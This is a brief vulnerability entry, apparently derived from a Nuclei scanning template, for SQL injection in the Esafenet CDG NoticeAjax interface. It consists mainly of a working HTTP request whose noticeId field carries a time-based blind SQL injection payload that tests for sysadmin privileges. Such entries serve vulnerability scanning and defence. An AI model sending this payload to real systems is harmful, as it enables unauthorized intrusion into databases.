# Vulnerability: Esafenet CDG NoticeAjax - Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`esafenet-noticeajax-sqli.yaml`)

## Description
CDGServer3 NoticeAjax Interface Sql Injection.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
POST /CDGServer3/NoticeAjax;Service HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded

command=delNotice&noticeId=123';if+(select+IS_SRVROLEMEMBER('sysadmin'))=1+WAITFOR+DELAY+'0:0:5'--
```

